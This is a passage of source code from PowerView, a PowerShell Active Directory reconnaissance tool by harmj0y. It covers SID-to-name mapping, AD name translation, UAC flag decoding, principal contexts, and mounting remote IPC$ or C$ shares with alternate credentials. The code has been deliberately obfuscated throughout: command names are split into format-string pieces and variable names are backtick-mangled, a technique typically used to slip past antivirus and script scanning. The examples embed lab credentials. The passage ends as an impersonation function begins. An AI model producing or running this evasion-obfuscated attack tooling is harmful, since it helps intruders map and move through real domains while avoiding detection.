                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    ("{0}{1}" -f'De','fault') {
                        &("{1}{2}{3}{0}{4}"-f'Na','Co','nvert','-AD','me') -Identity ${t`ARgeT`sId} @ADNameArguments
                    }
                }
            }
            catch {
                &("{3}{0}{2}{1}"-f't','ose','e-Verb','Wri') "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function C`onveRt-ad`Na`me {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the following form:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity "TESTLAB\harmj0y"

harmj0y@testlab.local

.EXAMPLE

"TESTLAB\krbtgt", "CN=Administrator,CN=Users,DC=testlab,DC=local" | Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${tR`Ue}, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('Name', 'ObjectName')]
        [String[]]
        ${iden`T`ITy},

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${ou`T`puTtY`pe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RVER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`eDe`NT`Ial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${NAMe`TY`pEs} = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function I`N`Vok`e-MEtHoD([__ComObject] ${ObJ`E`Ct}, [String] ${m`etHoD}, ${pa`RAmE`TErS}) {
            ${O`UT`puT} = ${nu`ll}
            ${o`UtpUT} = ${o`BJE`ct}.GetType().InvokeMember(${ME`ThOd}, 'InvokeMethod', ${n`Ull}, ${obj`ecT}, ${PAr`A`ME`Ters})
            &("{0}{3}{1}{2}"-f 'W','-Outp','ut','rite') ${OUt`PUt}
        }

        function GE`T`-proPERty([__ComObject] ${OBJ`e`ct}, [String] ${P`ROp`eRTY}) {
            ${o`Bject}.GetType().InvokeMember(${PROP`ER`Ty}, 'GetProperty', ${N`ULl}, ${O`B`jECT}, ${n`Ull})
        }

        function sEt`-PRoper`TY([__ComObject] ${o`BjE`Ct}, [String] ${Pr`OPE`Rty}, ${PArA`MeTE`RS}) {
            [Void] ${obJe`Ct}.GetType().InvokeMember(${PR`OP`E`RTy}, 'SetProperty', ${Nu`LL}, ${ob`j`Ect}, ${PARA`M`e`Ters})
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if (${PsbOuN`D`p`AraMe`TErs}['Server']) {
            ${Ads`IniTt`yPe} = 2
            ${InI`TNa`me} = ${s`E`RveR}
        }
        elseif (${PSBo`U`NDpara`METeRs}['Domain']) {
            ${AdS`i`NitTy`pe} = 1
            ${INi`TNA`me} = ${Doma`in}
        }
        elseif (${pS`BoU`N`dpa`RAM`eTErS}['Credential']) {
            ${Cr`ed} = ${cre`d`ENtIal}.GetNetworkCredential()
            ${ADSI`N`it`TYPe} = 1
            ${iN`ITN`AmE} = ${CR`Ed}.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            ${aD`s`inI`TTyPe} = 3
            ${InI`Tna`mE} = ${N`Ull}
        }
    }

    PROCESS {
        ForEach (${TArGe`T`Id`enTitY} in ${iDE`N`T`ITY}) {
            if (-not ${P`Sbou`ND`parameteRS}['OutputType']) {
                if (${tA`Rg`EtIdENtITY} -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    ${A`dSoUTP`UtT`Ype} = ${nAmeTY`p`ES}['DomainSimple']
                }
                else {
                    ${ad`soUTPu`TTYPe} = ${naMe`TY`p`ES}['NT4']
                }
            }
            else {
                ${a`DSo`UtputTY`pE} = ${NaMeT`y`Pes}[${Out`puT`Ty`pE}]
            }

            ${tr`ANsl`ATe} = &("{1}{2}{0}" -f't','New','-Objec') -ComObject ("{0}{2}{1}{4}{3}"-f 'Nam','Transl','e','te','a')

            if (${Ps`B`Oundp`A`RAm`eterS}['Credential']) {
                try {
                    ${cr`eD} = ${crEdE`NT`I`Al}.GetNetworkCredential()

                    &("{1}{3}{2}{4}{0}"-f'd','Inv','Me','oke-','tho') ${TrA`Ns`LaTE} 'InitEx' (
                        ${adSi`NiT`Ty`pE},
                        ${I`NiTn`AmE},
                        ${C`REd}.UserName,
                        ${cr`eD}.Domain,
                        ${cr`Ed}.Password
                    )
                }
                catch {
                    &("{2}{0}{1}" -f'te-Verbo','se','Wri') "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    ${n`UlL} = &("{3}{2}{0}{1}"-f 'et','hod','ke-M','Invo') ${TRA`Ns`LATE} 'Init' (
                        ${ADS`I`N`iTtYPE},
                        ${IniTnA`me}
                    )
                }
                catch {
                    &("{0}{1}{3}{2}"-f'Wr','i','Verbose','te-') "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # always chase all referrals
            &("{2}{0}{1}{3}"-f'et-','Proper','S','ty') ${TRa`Ns`LATE} 'ChaseReferral' (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                ${Nu`LL} = &("{2}{1}{0}" -f'voke-Method','n','I') ${t`RanS`La`TE} 'Set' (8, ${tar`GE`TI`deNTiTY})
                &("{2}{0}{1}" -f 'tho','d','Invoke-Me') ${T`RAn`SLaTE} 'Get' (${adS`o`UTP`Utty`PE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{0}{4}{2}{1}{3}" -f'Wr','bos','er','e','ite-V') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function CoN`VeRtFROm-UACVA`l`Ue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${t`RUE}, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${t`RuE})]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${vA`luE},

        [Switch]
        ${s`HowALl}
    )

    BEGIN {
        # values from https://support.microsoft.com/en-us/kb/305144
        ${U`ACVA`LUes} = &("{3}{0}{2}{1}"-f'ew','t','-Objec','N') ("{4}{2}{0}{6}{1}{5}{8}{7}{3}" -f '.S','ec','stem.Collections','tionary','Sy','iali','p','dDic','zed.Ordere')
        ${U`ACv`ALuEs}.Add("SCRIPT", 1)
        ${ua`C`VA`LUeS}.Add("ACCOUNTDISABLE", 2)
        ${UaC`Valu`eS}.Add("HOMEDIR_REQUIRED", 8)
        ${uA`cva`L`UeS}.Add("LOCKOUT", 16)
        ${u`ACVA`LUES}.Add("PASSWD_NOTREQD", 32)
        ${UAcvaL`U`ES}.Add("PASSWD_CANT_CHANGE", 64)
        ${UAcv`A`LUEs}.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        ${uAc`VAl`UES}.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        ${Ua`Cva`LUES}.Add("NORMAL_ACCOUNT", 512)
        ${U`AcV`ALUes}.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        ${Ua`Cva`lUEs}.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        ${U`ACVAlu`eS}.Add("SERVER_TRUST_ACCOUNT", 8192)
        ${UaCVA`LU`ES}.Add("DONT_EXPIRE_PASSWORD", 65536)
        ${uACv`AlU`ES}.Add("MNS_LOGON_ACCOUNT", 131072)
        ${UaCv`AlU`Es}.Add("SMARTCARD_REQUIRED", 262144)
        ${U`Ac`VA`luES}.Add("TRUSTED_FOR_DELEGATION", 524288)
        ${U`A`cvaLu`ES}.Add("NOT_DELEGATED", 1048576)
        ${UaCV`AL`UeS}.Add("USE_DES_KEY_ONLY", 2097152)
        ${uAc`VAlu`eS}.Add("DONT_REQ_PREAUTH", 4194304)
        ${U`ACval`UeS}.Add("PASSWORD_EXPIRED", 8388608)
        ${U`A`cvALu`eS}.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        ${uACVA`l`Ues}.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        ${re`sULtUa`c`ValUES} = &("{2}{0}{1}" -f 'ew-Obje','ct','N') ("{5}{10}{2}{8}{6}{0}{3}{4}{11}{12}{7}{13}{1}{14}{9}" -f'Collect','dD','ste','ion','s.Speci','S','.','.','m','ionary','y','alize','d','Ordere','ict')

        if (${S`hO`WaLL}) {
            ForEach (${uAC`VaLUE} in ${UAcV`A`l`UEs}.GetEnumerator()) {
                if ( (${VAL`UE} -band ${u`Ac`VaLue}.Value) -eq ${UAcv`AluE}.Value) {
                    ${R`esUL`TuacVALu`eS}.Add(${UAC`Val`Ue}.Name, "$($UACValue.Value)+")
                }
                else {
                    ${RESulTu`AcvAl`Ues}.Add(${U`ACvAluE}.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${u`A`cVALue} in ${U`AcvaL`UeS}.GetEnumerator()) {
                if ( (${VA`L`UE} -band ${UA`cVA`Lue}.Value) -eq ${UAcv`ALUE}.Value) {
                    ${ResUlTu`A`CvaLU`eS}.Add(${uACV`A`l`UE}.Name, "$($UACValue.Value)")
                }
            }
        }
        ${resuLt`U`Ac`VaLues}
    }
}


function gEt-`PRIn`CIpa`LcoNTExT {
<#
.SYNOPSIS

Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
and simplified identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
or a DOMAIN\username identity.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${i`De`NTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMaIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDEnt`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    &("{2}{0}{1}"-f 'dd-','Type','A') -AssemblyName ("{6}{1}{8}{7}{9}{4}{3}{5}{0}{2}"-f 'emen','m.Di','t','ntM','.Accou','anag','Syste','yServic','rector','es')

    try {
        if (${psBO`U`N`dPArameTERs}['Domain'] -or (${I`DeNtIty} -match '.+\\.+')) {
            if (${Id`eNT`ity} -match '.+\\.+') {
                # DOMAIN\groupname
                ${C`onvE`R`TEDiDEN`Tity} = ${Id`ent`iTy} | &("{4}{0}{1}{3}{2}" -f 'ver','t-ADNa','e','m','Con') -OutputType ("{2}{0}{1}" -f 'onica','l','Can')
                if (${con`VeR`TeDid`eNtItY}) {
                    ${c`ON`Ne`CTTAR`GeT} = ${co`Nv`eRTEDIDE`NTity}.SubString(0, ${con`V`eRTE`DiDen`TIty}.IndexOf('/'))
                    ${OBJeC`TiDe`N`TiTY} = ${i`dEN`TIty}.Split('\')[1]
                    &("{2}{0}{1}"-f'rite-Verbo','se','W') "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                ${OBJE`C`T`idE`NtitY} = ${i`dEN`TITy}
                &("{0}{1}{2}{3}"-f 'Writ','e-Ve','rbos','e') "[Get-PrincipalContext] Binding to domain '$Domain'"
                ${CoN`N`eC`TtA`RGEt} = ${Do`Ma`iN}
            }

            if (${psBouND`PaRAm`e`TeRs}['Credential']) {
                &("{2}{0}{3}{1}"-f'rite-','e','W','Verbos') '[Get-PrincipalContext] Using alternate credentials'
                ${cO`NT`EXt} = &("{0}{2}{1}" -f 'New-O','t','bjec') -TypeName ("{9}{12}{4}{1}{7}{5}{10}{14}{13}{8}{3}{0}{15}{6}{11}{2}"-f '.Prin','em.Dir','xt','nt','st','ic','ipalC','ectoryServ','me','S','es.Accoun','onte','y','nage','tMa','c') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${Conn`e`CtTaRGet}, ${CRe`dEn`T`iaL}.UserName, ${CReD`e`NTIaL}.GetNetworkCredential().Password)
            }
            else {
                ${c`ON`TexT} = &("{2}{0}{1}"-f'ew-O','bject','N') -TypeName ("{4}{9}{2}{7}{0}{5}{8}{3}{1}{6}" -f'rec','.AccountM','tem.D','ices','Sy','t','anagement.PrincipalContext','i','oryServ','s') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${cO`NneC`T`TaRGEt})
            }
        }
        else {
            if (${p`sb`OU`NDparAMET`ers}['Credential']) {
                &("{2}{0}{1}" -f't','e-Verbose','Wri') '[Get-PrincipalContext] Using alternate credentials'
                ${d`omAin`Na`me} = &("{2}{0}{1}"-f 't-D','omain','Ge') | &("{0}{1}{3}{2}"-f'Select','-','ect','Obj') -ExpandProperty ("{0}{1}" -f 'Nam','e')
                ${C`OnT`ExT} = &("{0}{1}{2}"-f'New-Ob','je','ct') -TypeName ("{13}{10}{3}{12}{9}{11}{7}{1}{8}{0}{2}{6}{4}{5}" -f 'Princ','men','i','v','Contex','t','pal','e','t.','es.AccountM','ystem.DirectorySer','anag','ic','S') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${D`O`mAiNNA`Me}, ${crE`deN`Ti`AL}.UserName, ${c`Red`entiAl}.GetNetworkCredential().Password)
            }
            else {
                ${CO`NT`EXt} = &("{0}{1}{2}"-f'New-O','bj','ect') -TypeName ("{2}{6}{1}{3}{11}{13}{0}{5}{10}{7}{12}{4}{8}{9}"-f 'c','rect','S','or','C','countManagement.Prin','ystem.Di','pa','ont','ext','ci','yServic','l','es.A') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${oBjE`C`T`IDeNTiTY} = ${i`denT`ItY}
        }

        ${O`UT} = &("{2}{3}{1}{0}"-f't','jec','N','ew-Ob') ("{1}{0}{2}"-f 'bjec','PSO','t')
        ${O`Ut} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{1}{0}{2}"-f'r','Noteprope','ty') 'Context' ${Co`Nte`XT}
        ${o`Ut} | &("{2}{0}{1}"-f 'dd-Memb','er','A') ("{0}{1}{2}{3}" -f 'No','tep','roper','ty') 'Identity' ${ObJE`c`Tide`N`Tity}
        ${O`Ut}
    }
    catch {
        &("{2}{0}{1}" -f 'ri','te-Warning','W') "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function ADd-rEMo`Te`Co`NneCT`ioN {
<#
.SYNOPSIS

Pseudo "mounts" a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isn't
specified, a -ComputerName is required to pseudo-mount IPC$.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection
to the specified remote -Path (\\UNC\share) with the alternate credentials specified in the
-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.

To destroy the connection, use Remove-RemoteConnection with the same specified \\UNC\share path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

$Cred = Get-Credential
Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred

.EXAMPLE

$Cred = Get-Credential
@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred
#>

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${t`Rue}, ParameterSetName = 'ComputerName', ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coM`p`UtErN`AMe},

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = ${tr`UE})]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        ${PA`TH},

        [Parameter(Mandatory = ${TR`Ue})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EDE`Ntial}
    )

    BEGIN {
        ${netResOURcE`iNsT`A`N`ce} = [Activator]::CreateInstance(${nE`TrESOuRc`eW})
        ${n`ETre`SoUrCEin`STAnCe}.dwType = 1
    }

    PROCESS {
        ${p`AthS} = @()
        if (${PsBouN`dP`AR`AMeTers}['ComputerName']) {
            ForEach (${tARgetcO`M`PuTER`NAMe} in ${c`ompUte`Rna`Me}) {
                ${tArgEt`com`Pu`Te`R`NAmE} = ${t`Arget`computeR`N`Ame}.Trim('\')
                ${Pa`T`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${p`A`Ths} += ,${pa`Th}
        }

        ForEach (${TA`RGETP`A`Th} in ${pAT`hS}) {
            ${NeTrEso`URCeInSt`An`cE}.lpRemoteName = ${TA`RGe`TP`ATh}
            &("{1}{3}{0}{2}" -f 's','Write-Verb','e','o') "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            ${r`EsULT} = ${m`pr}::WNetAddConnection2W(${nETrEso`UrceIN`Sta`NcE}, ${crE`d`en`TiaL}.GetNetworkCredential().Password, ${cr`e`DeNtiAL}.UserName, 4)

            if (${r`Es`UlT} -eq 0) {
                &("{0}{1}{2}" -f'Wr','ite-Verbos','e') "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function REmovE-`Re`motecOnNec`TI`on {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isn't specified, a -ComputerName is required to
'unmount' \\$ComputerName\IPC$.

.PARAMETER ComputerName

Specifies the system to remove a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName 'PRIMARY.testlab.local'

.EXAMPLE

Remove-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\'

.EXAMPLE

@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue}, ParameterSetName = 'ComputerName', ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`O`mp`UTernAmE},

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = ${tr`UE})]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        ${Pa`Th}
    )

    PROCESS {
        ${PaT`hs} = @()
        if (${Psbou`ND`P`ARAmEtERS}['ComputerName']) {
            ForEach (${taRG`e`TCO`MPUtE`R`NAMe} in ${c`OMP`U`TERnA`me}) {
                ${ta`RgEt`CO`mPuTe`RNAME} = ${Ta`R`gEtcoMputE`RNaME}.Trim('\')
                ${P`A`ThS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${P`AtHS} += ,${p`ATH}
        }

        ForEach (${t`ArGE`Tp`ATh} in ${P`AtHs}) {
            &("{3}{2}{1}{0}" -f'ose','Verb','e-','Writ') "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            ${rEs`UlT} = ${M`Pr}::WNetCancelConnection2(${tArgET`pa`Th}, 0, ${T`RUe})

            if (${r`eSu`Lt} -eq 0) {
                &("{0}{3}{1}{2}"-f'Wri','rbos','e','te-Ve') "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function iN`VOkE-US`Eri`mPErsONA`TIoN {
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

